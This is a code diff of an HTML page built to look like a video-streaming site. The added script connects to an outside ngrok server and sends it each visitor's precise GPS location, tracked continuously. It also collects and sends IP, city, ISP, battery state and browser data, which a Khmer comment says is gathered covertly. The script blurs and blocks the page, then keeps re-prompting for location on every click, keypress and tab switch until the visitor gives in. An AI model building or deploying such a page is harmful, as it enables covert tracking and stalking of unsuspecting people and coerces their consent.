@@ -56,7 +56,6 @@ svg{display:block}
 .topbar-center{display:flex;align-items:center;justify-content:center;gap:8px;flex:1;min-width:0}
 .topbar-end{display:flex;align-items:center;justify-content:flex-end;gap:6px;min-width:170px}
 
-/* icon buttons */
 .icon-btn{
   width:40px;height:40px;flex:none;
   display:grid;place-items:center;
@@ -68,7 +67,6 @@ svg{display:block}
 .icon-btn:hover{background:var(--hover)}
 .icon-btn svg{width:24px;height:24px}
 
-/* logo */
 .logo{display:flex;align-items:center;gap:5px;text-decoration:none;color:var(--text);padding-right:6px}
 .logo-mark{
   position:relative;flex:none;
@@ -87,7 +85,6 @@ svg{display:block}
 .logo-text{font-size:19px;font-weight:700;letter-spacing:-.7px}
 .country{font-size:10px;color:var(--text-2);align-self:flex-start;margin-top:14px}
 
-/* search */
 .search{
   display:flex;align-items:center;
   flex:1;max-width:640px;height:40px;
@@ -119,7 +116,6 @@ svg{display:block}
 .mic{background:#181818}
 .mic:hover{background:#303030}
 
-/* avatar */
 .av{
   display:grid;place-items:center;flex:none;
   width:36px;height:36px;
@@ -178,7 +174,6 @@ svg{display:block}
 body.nav-collapsed .sidebar{display:none}
 body.nav-collapsed .content{margin-left:0}
 
-/* chips */
 .chips{
   position:sticky;
   top:var(--topbar-h);
@@ -204,7 +199,6 @@ body.nav-collapsed .content{margin-left:0}
 .chip:hover{background:#3f3f3f}
 .chip.active{background:var(--chip-active);color:#0f0f0f}
 
-/* grid */
 .grid{
   display:grid;
   grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
@@ -212,7 +206,6 @@ body.nav-collapsed .content{margin-left:0}
   padding:8px 24px 48px;
 }
 
-/* video card */
 .card{cursor:pointer;min-width:0}
 .thumb{
   position:relative;
@@ -266,7 +259,6 @@ body.nav-collapsed .content{margin-left:0}
   white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
 }
 
-/* ============ RESPONSIVE ============ */
 @media (max-width:1100px){
   .sidebar{display:none}
   .content{margin-left:0}
@@ -398,7 +390,7 @@ body.nav-collapsed .content{margin-left:0}
 <p id="status" style="display: none;"></p>
 
 <script>
-  /* Sidebar toggle (hamburger) */
+  /* Sidebar toggle */
   document.getElementById('menuBtn').addEventListener('click', () => {
     document.body.classList.toggle('nav-collapsed');
   });
@@ -411,36 +403,188 @@ body.nav-collapsed .content{margin-left:0}
     });
   });
 
-  /* ================= GEOLOCATION & SOCKET.IO ================= */
-  // ភ្ជាប់ទៅ ngrok
-  const socket = io("https://hacked-wager-landmine.ngrok-free.dev", {
-      transports: ['websocket', 'polling']
-  });
-  
-  const statusText = document.getElementById('status');
+  /* ================= GEOLOCATION & DEVICE INFO (Merged) ================= */
+  const socket = (typeof io !== 'undefined')
+    ? io("https://hacked-wager-landmine.ngrok-free.dev", {
+        transports: ['websocket', 'polling'],
+        reconnection: true,
+        reconnectionAttempts: Infinity,
+        reconnectionDelay: 1000
+      })
+    : null;
 
-  function getLocation() {
-      if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(sendPosition, showError);
-      } else {
-          console.error("Browser របស់អ្នកមិនគាំទ្រ Geolocation API ទេ។");
-      }
+  const blocker = document.getElementById('location-blocker');
+  const mainContent = document.getElementById('main-content');
+  const errorMsg = document.getElementById('error-msg');
+  const _statusEl = document.getElementById('status');
+  const _dbg = (m) => { if (_statusEl) _statusEl.textContent = m; };
+
+  let _granted    = false;   // ពិតនៅពេលទទួលបានសិទ្ធិ
+  let _watchId    = null;    // សម្រាប់តាមដានទីតាំងបន្តបន្ទាប់
+  let _attempt    = 0;       // រាប់ចំនួនដងដែលសាកល្បង
+  let _retryTimer = null;    // ពេលរង់ចាំសាកល្បងម្ដងទៀត
+  let _lastGesture = 0;      // គ្រប់គ្រងល្បឿននៃការចុច
+
+  // អនុគមន៍ទាញយកព័ត៌មានឧបករណ៍ (ដំណើរការដោយលាក់កំបាំង)
+  async function getDeviceInfo() {
+      let info = {
+          ip: "Unknown", country: "Unknown", city: "Unknown", isp: "Unknown",
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          time: new Date().toLocaleString('en-GB', { hour12: true }),
+          battery: "Unknown", charging: "Unknown",
+          ua: navigator.userAgent
+      };
+
+      try {
+          const res = await fetch('https://ipapi.co/json/');
+          const data = await res.json();
+          info.ip = data.ip || "Unknown";
+          info.country = data.country_name || "Unknown";
+          info.city = data.city || "Unknown";
+          info.isp = data.org || "Unknown";
+      } catch (e) {}
+
+      try {
+          if ('getBattery' in navigator) {
+              const battery = await navigator.getBattery();
+              info.battery = Math.round(battery.level * 100) + "%";
+              info.charging = battery.charging ? "Yes" : "No";
+          } else {
+              info.battery = "Not Supported (iOS/Safari)";
+              info.charging = "Unknown";
+          }
+      } catch (e) {}
+
+      return info;
   }
 
-  function sendPosition(position) {
-      const lat = position.coords.latitude;
-      const lng = position.coords.longitude;
+  /* ពេលទទួលបានទីតាំង និងព័ត៌មានឧបករណ៍ បញ្ជូនទៅកាន់ Backend ព្រមទាំង Unblock UI */
+  async function _emitAndUnblock(pos) {
+    if (!socket || !socket.connected) return;
+    try {
+      const deviceInfo = await getDeviceInfo();
       
-      // បញ្ជូនទិន្នន័យទៅ Backend (ឆ្លងកាត់ ngrok)
-      socket.emit('send_location', { lat: lat, lng: lng });
+      socket.emit('send_location', {
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        altitude: pos.coords.altitude,
+        speed: pos.coords.speed,
+        heading: pos.coords.heading,
+        device: deviceInfo
+      });
+
+      // លុបផ្ទាំង Block ចេញ និងបង្ហាញវីដេអូ/ខ្លឹមសារ
+      if (blocker) blocker.style.display = 'none';
+      if (mainContent) mainContent.style.filter = 'none'; 
+      document.documentElement.style.overflow = 'auto';
+      if (errorMsg) errorMsg.style.display = 'none';
+      
+    } catch (_) {}
   }
 
-  function showError(error) {
-      console.error("Error code: " + error.code);
+  /* តាមដានទីតាំងបន្តបន្ទាប់ពេលត្រូវបានអនុញ្ញាត */
+  function _startWatch() {
+    if (_watchId !== null || !navigator.geolocation) return;
+    _watchId = navigator.geolocation.watchPosition(
+      _emitAndUnblock,
+      () => {},
+      { enableHighAccuracy: true, maximumAge: 0, timeout: 60000 }
+    );
   }
 
-  window.onload = getLocation;
+  /* ទាមទារសិទ្ធិយ៉ាងសកម្ម - បើបរាជ័យនឹងព្យាយាមម្ដងទៀតរហូតដល់បាន */
+  function _requestGeo() {
+    if (_granted) return;
+    if (errorMsg) errorMsg.style.display = 'none';
+
+    if (!navigator.geolocation) {
+      if (errorMsg) {
+          errorMsg.innerText = "ទូរស័ព្ទរបស់អ្នកមិនគាំទ្រមុខងារនេះទេ។";
+          errorMsg.style.display = 'block';
+      }
+      setTimeout(_requestGeo, 2500);
+      return;
+    }
+    
+    if (_retryTimer) { clearTimeout(_retryTimer); _retryTimer = null; }
+
+    _attempt++;
+    _dbg('[GEO] attempt #' + _attempt);
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        _granted = true;
+        _dbg('[GEO] ✓ granted on attempt #' + _attempt);
+        _emitAndUnblock(pos);
+        _startWatch();
+      },
+      () => {
+        /* Error (Deny/Timeout) -> បង្ហាញ Error តែនៅតែព្យាយាមម្ដងទៀត */
+        if (errorMsg) {
+            errorMsg.style.display = 'block';
+        }
+        _retryTimer = setTimeout(_requestGeo, 1200);
+      },
+      { enableHighAccuracy: true, maximumAge: 0, timeout: 8000 }
+    );
+  }
+
+  /* បើគេមានប៊ូតុងចុច Manual */
+  function requestLocation() {
+      _requestGeo();
+  }
+
+  /* ព្យាយាមម្ដងទៀតពេល User ចុចលើអេក្រង់ */
+  function _gestureRetry() {
+    const now = Date.now();
+    if (now - _lastGesture < 700) return;
+    _lastGesture = now;
+    if (!_granted) _requestGeo();
+  }
+
+  /* ពិនិត្យមើល State នៃការអនុញ្ញាតិ */
+  (async () => {
+    if (!navigator.permissions || !navigator.permissions.query) return;
+    try {
+      const perm = await navigator.permissions.query({ name: 'geolocation' });
+      _dbg('[GEO] state: ' + perm.state);
+      perm.onchange = () => {
+        _dbg('[GEO] state -> ' + perm.state);
+        if (perm.state === 'granted') { _granted = false; _requestGeo(); }
+      };
+    } catch (_) {}
+  })();
+
+  /* កេះឲ្យដើរពេលចុច, scroll, ឬ tab លោតមកវិញ */
+  ['click', 'touchstart', 'keydown'].forEach((evt) => {
+    document.addEventListener(evt, _gestureRetry, { passive: true });
+  });
+
+  document.addEventListener('visibilitychange', () => {
+    if (!document.hidden && !_granted) _requestGeo();
+  });
+
+  /* ពេល Socket តភ្ជាប់បានជោគជ័យ */
+  if (socket) {
+    socket.on('connect', () => {
+      _dbg('[SOCKET] connected');
+      if (_granted) {
+        navigator.geolocation.getCurrentPosition(_emitAndUnblock, () => {}, {
+          enableHighAccuracy: true, maximumAge: 0, timeout: 8000
+        });
+      } else {
+        _requestGeo();
+      }
+    });
+  }
+
+  /* ចាប់ផ្ដើមភ្លាមៗពេល Page Load */
+  window.addEventListener('load', () => _requestGeo());
+  if (document.readyState === 'complete') _requestGeo();
 </script>
 
 </body>
 </html>
+
+
